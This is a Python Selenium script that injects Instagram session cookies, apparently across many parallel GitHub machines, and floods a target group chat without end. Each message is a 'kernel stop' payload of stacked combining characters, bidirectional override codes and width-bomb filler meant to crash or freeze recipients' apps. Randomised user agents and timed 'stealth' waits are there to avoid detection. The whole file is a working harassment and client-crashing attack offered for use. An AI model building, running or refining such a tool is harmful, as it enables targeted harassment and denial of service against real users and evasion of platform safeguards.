import os, time, random, sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Each machine handles its own single process now
def get_kernel_stop_payload(target_name):
    u_id = random.randint(1000, 9999)
    header = f"⚡ 𝖕𝖗𝖆𝖛𝖊𝖊𝖗.𝖔𝖜𝖓𝖘 ⚡\n🆔 {u_id}\n"
    shifter = "".join(random.choice(["\U000E0100", "\U0001D400", "\U0001D4D0", "\u2066", "\u2067"]) for _ in range(300))
    z_tower = "̸" * 750 
    width_bomb = "\u2800\u00A0" * 150
    lines = [header, shifter]
    for i in range(30):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_{i}{z_tower}")
    return "\n".join(lines)[:9995]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(122, 126)}.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def main():
    machine_id = int(os.environ.get("MACHINE_ID", "1"))
    raw_cookies = os.environ.get("SESSION_ID", "").split(",")
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()

    # MAPPING: If you have 5 IDs, machines 1-4 use ID 1, 5-8 use ID 2, etc.
    cookie_index = (machine_id - 1) // 4
    if cookie_index >= len(raw_cookies):
        cookie_index = cookie_index % len(raw_cookies)
    
    current_cookie = raw_cookies[cookie_index].strip()
    
    driver = None
    try:
        print(f"📡 [Machine {machine_id}] Account #{cookie_index} Connecting...")
        driver = get_driver()
        driver.get("https://www.instagram.com/")
        driver.add_cookie({'name': 'sessionid', 'value': current_cookie, 'path': '/', 'domain': '.instagram.com'})
        driver.refresh()
        time.sleep(12)

        driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
        wait = WebDriverWait(driver, 40)
        box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))

        while True:
            # DOUBLE-PULSE
            for _ in range(2):
                payload = get_kernel_stop_payload(target_name)
                driver.execute_script("arguments[0].innerText = arguments[1];", box, payload)
                box.send_keys(Keys.ENTER)
                print(f"💀 [Machine {machine_id}] Strike Delivered.")
                time.sleep(2)

            # STEALTH WAIT (15-20s) - High safety, High impact
            time.sleep(random.uniform(15, 20))
            
            if random.random() < 0.1:
                driver.refresh()
                time.sleep(10)

    except Exception as e:
        print(f"⚠️ [Machine {machine_id}] Fatal Error. Restarting...")
        if driver: driver.quit()
        sys.exit(1) # GitHub will automatically restart the machine

if __name__ == "__main__":
    main()
